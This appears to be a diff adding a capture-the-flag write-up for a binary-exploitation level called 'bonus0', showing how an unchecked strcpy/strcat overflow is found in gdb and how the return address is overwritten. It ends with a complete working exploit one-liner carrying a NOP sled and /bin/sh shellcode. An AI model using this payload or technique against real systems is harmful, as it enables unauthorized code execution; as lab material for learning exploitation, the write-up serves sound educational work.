@@ -1,0 +1,51 @@
+The strcpy and strcat in the function pp is not protected against overflows
+
+When testing, we see that sending strings that ave more than 20 chars for both reads leads to a segfault:
+
+gdb bonus0
+r
+type: xxxxxxxxxxxxxxxxxxxx
+type: aaaabbbbccccddddeeeeffff
+Segfault, let's see the backtrace:
+
+bt
+#0  0x64636363 in ?? ()
+#1  0x65646464 in ?? ()
+#2  0xf4656565 in ?? ()
+#3  0x00b7fd0f in ?? ()
+#4  0xb7fdc858 in ?? ()
+
+0x64636363 is our "cccd" part of the second input string (reversed), we can override the return pointer, and thus execute a shellcode
+
+We will take the shellcode from level2
+
+We will put our shellcode on the read buffer in the function p, as it is large enough
+Our exploit will be:
+first input string: 20 padding chars;
+second string: 9 padding + adress of shellcode + shellcode
+
+We still need to find the adress of our shellcode.
+As it is on the read buffer, it's adress is the adress of the buffer + 9 + 4 (padding + adress)
+
+To find the adress of the buffer we break just before the read instruction and we examine the stack to see the arguments passed to instruction passed to it:
+
+gdb /home/user/bonus0/bonus0
+unset env LINES
+unset env COLUMNS
+b *0x080484e1
+r
+x/2a $esp
+0xbfffe670:	0x0 0xbfffe6b0
+
+The adress is 0xbfffe6b0, let's verify it:
+ni
+type: aaaabbbb
+x/s 0xbfffe6b0
+0xbfffe6b0:	 "aaaabbbb\n"
+
+0xbfffe6b0 + 13 = 0xbfffe6bd
+
+(echo "xxxxxxxxxxxxxxxxxxxx"; python -c "print 'x' * 9 + '\xbd\xe6\xff\xbf' + '\x90' * 100 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'") | /home/user/bonus0/bonus0
+
+I had some problems running this exploit outside gdb, env variables/argv seems to be different no matter what i tried (unset env ...)
+I hadded a nopsled (some \x90 before the shellcode) and it worked well.
